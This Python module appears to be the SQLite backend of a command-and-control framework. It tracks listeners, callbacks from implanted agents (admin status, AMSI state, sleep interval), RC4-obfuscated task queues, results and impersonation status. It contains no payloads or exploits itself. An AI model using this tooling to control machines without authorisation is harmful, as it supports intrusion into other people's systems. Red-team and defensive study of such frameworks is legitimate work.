import sqlite3
import configparser
import os
from prettytable import PrettyTable
from colorama import Fore, Back, Style
from flask import jsonify
import uuid
from datetime import datetime
from utils import RC4Util
rc4 = RC4Util.RC4()
import time

def get_db_config():
    config = configparser.ConfigParser()
    # Get the directory of this script
    dir_path = os.path.dirname(os.path.realpath(__file__))
    # Construct the full path to the config.ini file
    config_file_path = os.path.join(dir_path, 'config.ini')
    config.read(config_file_path)
    return config['sqlite']['database']

def connect_to_db():
    database = get_db_config()
    conn = sqlite3.connect(database)
    return conn

def close_connection(conn):
    conn.close()


def get_callbacks():
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM callbacks")
    data = cursor.fetchall()
    close_connection(conn)
    return data


def add_task(command, target_id, RCKey):
    task_uuid = str(uuid.uuid4())
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO Tasks (uuid, command, target_id, status, sent_time) VALUES (?, ?, ?, 'pending', datetime('now'))", (task_uuid, rc4.obf(RCKey,command), target_id))
    conn.commit()
    close_connection(conn)

def add_task_UI(command, target_id, RCKey):
    task_uuid = str(uuid.uuid4())
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO Tasks (uuid, command, target_id, status, sent_time) VALUES (?, ?, ?, 'pending', datetime('now'))", (task_uuid, rc4.obf(RCKey,command), target_id))
    conn.commit()
    close_connection(conn)


def create_base_db_structure():
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS Listeners (
        ID TEXT PRIMARY KEY,
        port INTEGER,
        type TEXT,
        status TEXT,
        interface TEXT,
        domain TEXT
    )
    """)

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS Callbacks (
        id TEXT PRIMARY KEY,
        type TEXT,
        username TEXT,
        adminStatus TEXT,
        status TEXT,
        target TEXT,
        OS TEXT,
        amsi TEXT,
        sleep_interval INTEGER DEFAULT 5000,
        notes TEXT,
        latest_callbacktime TEXT
    )
    """)

    
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS Tasks (
        id INTEGER PRIMARY KEY,
        uuid TEXT,
        command TEXT,
        result TEXT,
        payload TEXT,
        target_id INTEGER,
        status TEXT DEFAULT 'pending',
        sent_time TEXT,
        completed_time TEXT,
        shown BOOLEAN DEFAULT FALSE,
        FOREIGN KEY(target_id) REFERENCES Callbacks(id)
    )
    """)

    
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS Results (
        id INTEGER PRIMARY KEY,
        task_id INTEGER,
        output TEXT,
        FOREIGN KEY(task_id) REFERENCES Tasks(id)
    )
    """)

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS Keys (
        id INTEGER PRIMARY KEY,
        auth_key TEXT,
        rc4_key TEXT
    )
    """)

    conn.commit()
    conn.close()


def is_db_empty():
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()

    conn.close()

    return len(tables) == 0

def is_db_file_exists():
    return os.path.isfile('primus.db')


def add_listener_to_db(listener):
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("""
        INSERT INTO listeners (ID, type, port, interface, domain, status)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (listener['ID'], listener['type'], listener['port'], listener['interface'], listener.get('domain', 'N/A'), listener['status']))

    conn.commit()
    conn.close()


def display_listeners_from_db():
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM listeners")
    listeners = cursor.fetchall()

    listener_table = PrettyTable()
    listener_table.field_names = [Fore.CYAN + 'ID', 'Port', 'Type', 'Status', 'Interface', 'Domain']
    listener_table.padding_width = 3

    for listener in listeners:
        listener_table.add_row(listener)

    print(listener_table)

    conn.close()

    return listeners

def get_listeners_gui():
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM listeners")
    listeners = cursor.fetchall()

    # Convert the list of tuples to a list of dictionaries to make it JSON serializable
    listeners_overview = [dict(zip([column[0] for column in cursor.description], row)) for row in listeners]

    conn.close()
    return listeners_overview

def update_all_listeners_status(status):
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("UPDATE listeners SET status = ?", (status,))
    conn.commit()

    conn.close()


def remove_all_listeners():
    # Connect to the database.
    with sqlite3.connect('primus.db') as conn:
        cursor = conn.cursor()

        # Delete all rows from the Listeners table.
        cursor.execute("DELETE FROM Listeners")
        conn.commit()

def add_keys_to_db(auth_key, rc4_key):
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("INSERT INTO keys (auth_key, rc4_key) VALUES (?, ?)", (auth_key, rc4_key))
    conn.commit()
    conn.close()

def keys_exist_in_db():
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM keys")
    keys = cursor.fetchall()

    conn.close()

    return len(keys) > 0

def clear_all_tables():
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("DELETE FROM Listeners")
    cursor.execute("DELETE FROM Callbacks")
    cursor.execute("DELETE FROM Tasks")
    cursor.execute("DELETE FROM Results")
    cursor.execute("DELETE FROM Keys")

    conn.commit()
    conn.close()

def add_callback_to_db(callback):
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("""
        INSERT INTO callbacks (id, type, username, adminStatus, status, target, OS, amsi, latest_callbacktime)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (callback['id'], callback['type'], callback['username'], callback['adminStatus'], callback['status'], callback['target'], callback['OS'], callback['amsi'], callback['latest_callbacktime']))

    conn.commit()
    conn.close()

def get_key(type):
    with connect_to_db() as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        cursor.execute("SELECT * FROM keys")
        keys = cursor.fetchone()

        if type == 'auth_key':
            return keys['auth_key']
        else:
            return keys['rc4_key']
        
def display_callbacks_from_db():
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("SELECT DISTINCT id, type, username, adminStatus, status ,target, OS, amsi, latest_callbacktime, sleep_interval FROM callbacks")
    callbacks = cursor.fetchall()

    callback_table = PrettyTable()
    callback_table.field_names = [Fore.CYAN + 'ID', 'Type', 'Username', 'AdminStatus', 'Status', 'Target', 'OS', 'AMSI', 'LatestCallbackTime', 'SleepInterval']
    callback_table.padding_width = 3

    for callback in callbacks:
        callback_table.add_row(callback)

    print(callback_table)

    conn.close()

def update_callback_time(callback_id, new_time):
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("UPDATE callbacks SET latest_callbacktime = ? WHERE id = ?", (new_time, callback_id))
    conn.commit()

    conn.close()

def display_callbacks_gui():
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM callbacks")
    callbacks = cursor.fetchall()

    # Convert the list of tuples to a list of dictionaries to make it JSON serializable
    callbacks_overview = [dict(zip([column[0] for column in cursor.description], row)) for row in callbacks]

    conn.close()
    return callbacks_overview

def json_callback_data_by_id(callback_id):
    conn = connect_to_db()
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM callbacks WHERE id = ?", (callback_id,))
    callback = cursor.fetchall()

    callback_overview = [dict(zip([column[0] for column in cursor.description], row)) for row in callback]

    conn.close()
    return callback_overview


def add_task_to_db(command, target_id, payload=None):
    task_uuid = str(uuid.uuid4())
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO Tasks (uuid, command, target_id, payload, status, sent_time) VALUES (?, ?, ?, ?, 'pending', datetime('now'))", (task_uuid, command, target_id, payload))
    conn.commit()
    close_connection(conn)

def fetch_tasks_from_db(agent_id):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("SELECT command, payload FROM Tasks WHERE target_id = ? AND status = 'pending'", (agent_id,))
    tasks = cursor.fetchall()
    close_connection(conn)
    return tasks

def update_task_status(result, agent_id):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("""
    UPDATE Tasks 
    SET status = 'completed', result = ?, completed_time = datetime('now')  
    WHERE id = (
        SELECT id FROM Tasks 
        WHERE target_id = ? AND status = 'pending' 
        ORDER BY sent_time ASC 
        LIMIT 1
    )
""", (result, agent_id))
    conn.commit()
    close_connection(conn)

def update_callback_status(status, agent_id):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE callbacks SET status = ? WHERE id = ?", (status, agent_id))
    conn.commit()
    close_connection(conn)

def fetch_callback_data(agent_id):
    conn = connect_to_db()
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM callbacks WHERE id = ?", (agent_id,))
    callback = cursor.fetchone()
    close_connection(conn)
    return callback

def fetch_callback_id_all():
    conn = connect_to_db()
    conn.row_factory = lambda cursor, row: row[0]
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM callbacks")
    callback_ids = cursor.fetchall()
    close_connection(conn)
    return callback_ids




def fetch_result_to_gui(agent_id):
    conn = connect_to_db()
    cursor = conn.cursor()
    conn.row_factory = sqlite3.Row

    # Fetch all tasks for the given agent that have not been shown yet
    query = """
        SELECT id, command, result, sent_time, shown
        FROM tasks 
        WHERE target_id = ? AND shown = FALSE
        ORDER BY sent_time ASC
    """
    cursor.execute(query, (agent_id,))
    results = cursor.fetchall()

    if not results:
        return {"status": "no_tasks"}

    formatted_results = []

    for task_id, command, result, sent_time, shown in results:
        if result is None:
            return {"status": "task_not_ready"}

        formatted_result = result
        formatted_results.append(formatted_result)

        # Mark the task as shown
        update_query = "UPDATE tasks SET shown = TRUE WHERE id = ?"
        cursor.execute(update_query, (task_id,))
        conn.commit() 

    conn.close()

    return {"status": "success", "results": formatted_results}


def command_history(target_id):
    conn = connect_to_db()
    cursor = conn.cursor()

    # Fetch all tasks for the given target_id
    query = """
        SELECT command, result, sent_time
        FROM tasks 
        WHERE target_id = ?
        ORDER BY sent_time ASC
    """
    cursor.execute(query, (target_id,))
    results = cursor.fetchall()

    all_results = []
    if results:
        # Print each command and its result in a console-style view
        for command, result, sent_time in results:
            sent_time_datetime = datetime.strptime(sent_time, '%Y-%m-%d %H:%M:%S')
            formatted_result = f"[OPERATOR] - {sent_time_datetime.strftime('%a, %d %b %Y %H:%M:%S UTC')}: {command}\n{result}"
            
            all_results.append(formatted_result)

        return all_results    
    else:
        print(f"No results for target_id {target_id}")

    conn.close()


def update_sleep(sleep_interval, agent_id):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE callbacks SET sleep_interval = ? WHERE id = ?", (sleep_interval, agent_id))
    conn.commit()
    close_connection(conn)

def update_note_db(agent_id, notes):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE callbacks SET notes = ? WHERE id = ?", (notes, agent_id))
    conn.commit()
    close_connection(conn)

def impersonation_add(agent_id, name):
    conn = connect_to_db()
    cursor = conn.cursor()
    impersonation_name_full = f'Impersonating[{name}]'
    cursor.execute("UPDATE callbacks SET username = ? WHERE id = ?", (impersonation_name_full, agent_id))
    conn.commit()
    close_connection(conn)

def impersonation_remove(agent_id, name):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE callbacks SET username = ? WHERE id = ?", (name, agent_id))
    conn.commit()
    close_connection(conn)

def get_domain(listen_id):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("SELECT domain FROM listeners WHERE ID = ?", (listen_id,))
    domain = cursor.fetchone()
    close_connection(conn)
    return domain[0]

def get_all_domain_listeners():
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("SELECT ID, domain FROM listeners WHERE domain IS NOT NULL")
    listeners = cursor.fetchall()
    close_connection(conn)
    return listeners

def update_domain_listener(listen_id, domain):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE listeners SET domain = ? WHERE ID = ?", (domain, listen_id))
    conn.commit()
    close_connection(conn)


def get_interface_from_listener_id(listen_id):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("SELECT interface FROM listeners WHERE ID = ?", (listen_id,))
    interface = cursor.fetchone()
    close_connection(conn)
    return interface[0]

def get_port_from_listener_id(listen_id):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("SELECT port FROM listeners WHERE ID = ?", (listen_id,))
    port = cursor.fetchone()
    close_connection(conn)
    return port[0]

def get_user(listen_id):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute("SELECT username FROM callbacks WHERE id = ?", (listen_id,))
    user = cursor.fetchone()
    close_connection(conn)
    return user[0]